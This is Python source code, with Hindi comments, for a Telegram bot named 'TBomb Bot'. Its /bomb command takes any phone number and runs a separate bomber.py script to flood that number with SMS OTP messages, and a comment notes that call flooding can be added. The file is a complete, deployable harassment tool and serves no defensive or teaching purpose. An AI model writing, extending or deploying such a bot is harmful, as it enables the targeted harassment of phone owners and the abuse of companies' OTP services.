import os
import asyncio
import subprocess
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# Railway से Token लो
BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("TELEGRAM_BOT_TOKEN not set in environment!")

# TBomb स्क्रिप्ट का नाम
BOMBER_SCRIPT = "bomber.py"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔥 **TBomb Bot Ready!**\n"
        "Usage: `/bomb <phone_number>`\n"
        "Example: `/bomb 9876543210`\n\n"
        "⚠️ Note: APIs may be offline, but bot won't crash."
    )

async def bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Please provide phone number.\nUsage: `/bomb 9876543210`")
        return

    phone = context.args[0].strip()
    if not phone.isdigit() or len(phone) < 10:
        await update.message.reply_text("❌ Invalid phone number. Use digits only (min 10).")
        return

    msg = await update.message.reply_text(f"⏳ Sending OTPs to {phone}... (may take 30-60 sec)")

    try:
        # ✅ सही कमांड – बिना --phone, --threads, --timeout
        cmd = [
            "python3", BOMBER_SCRIPT,
            phone,          # positional argument (phone number)
            "--sms"         # SMS mode
        ]
        # अगर कॉल भी चाहिए तो "--call" डाल दो – मैंने सिर्फ SMS रखा है

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await proc.communicate()

        output = stdout.decode('utf-8', errors='ignore').strip()
        error = stderr.decode('utf-8', errors='ignore').strip()

        if proc.returncode == 0:
            response = f"✅ **Success!** OTPs sent to {phone}\n"
            if output:
                response += f"📝 Output:\n`{output[:300]}`"
            else:
                response += "No output from bomber."
            await msg.edit_text(response, parse_mode='Markdown')
        else:
            error_msg = error or "Unknown error (API offline?)"
            await msg.edit_text(
                f"❌ **Failed** to send OTPs.\n"
                f"Reason: `{error_msg[:200]}`\n\n"
                "💡 Tip: TBomb APIs are mostly dead, but bot is alive."
            )
    except Exception as e:
        await msg.edit_text(f"⚠️ Unexpected error: `{str(e)[:200]}`\nBut bot is still running.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("✅ Bot is active and healthy.")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bomb", bomb))
    app.add_handler(CommandHandler("status", status))
    print("🤖 TBomb Bot started. Press Ctrl+C to stop.")
    app.run_polling()

if __name__ == "__main__":
    main()
